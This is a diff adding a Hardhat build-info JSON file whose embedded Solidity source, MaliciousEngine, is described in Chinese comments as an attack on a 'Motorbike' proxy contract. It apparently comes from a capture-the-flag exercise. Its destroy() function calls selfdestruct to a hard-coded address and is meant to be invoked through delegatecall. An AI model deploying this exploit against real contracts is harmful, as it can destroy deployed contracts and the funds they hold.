@@ -1,0 +1,39 @@
+{
+  "_format": "hh3-sol-build-info-1",
+  "id": "solc-0_8_28-3b7e5710b2e75f831248af848aa51423d17576cd",
+  "solcVersion": "0.8.28",
+  "solcLongVersion": "0.8.28+commit.7893614a",
+  "userSourceNameMap": {
+    "contracts/MaliciousEngine.sol": "project/contracts/MaliciousEngine.sol"
+  },
+  "input": {
+    "language": "Solidity",
+    "settings": {
+      "evmVersion": "cancun",
+      "optimizer": {
+        "enabled": true,
+        "runs": 200
+      },
+      "outputSelection": {
+        "*": {
+          "": [
+            "ast"
+          ],
+          "*": [
+            "abi",
+            "evm.bytecode",
+            "evm.deployedBytecode",
+            "evm.methodIdentifiers",
+            "metadata"
+          ]
+        }
+      },
+      "remappings": []
+    },
+    "sources": {
+      "project/contracts/MaliciousEngine.sol": {
+        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * 惡意合約：用於攻擊 Motorbike 代理合約\r\n * 這個合約包含一個自毀函數，可以通過 delegatecall 執行\r\n */\r\ncontract MaliciousEngine {\r\n    /**\r\n     * 自毀函數\r\n     * 當通過 delegatecall 調用時，會銷毀代理合約（Motorbike）\r\n     * 因為 delegatecall 會在調用者的存儲上下文中執行\r\n     */\r\n    function destroy() external {\r\n        selfdestruct(payable(0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6));\r\n    }\r\n}\r\n\r\n"
+      }
+    }
+  }
+}
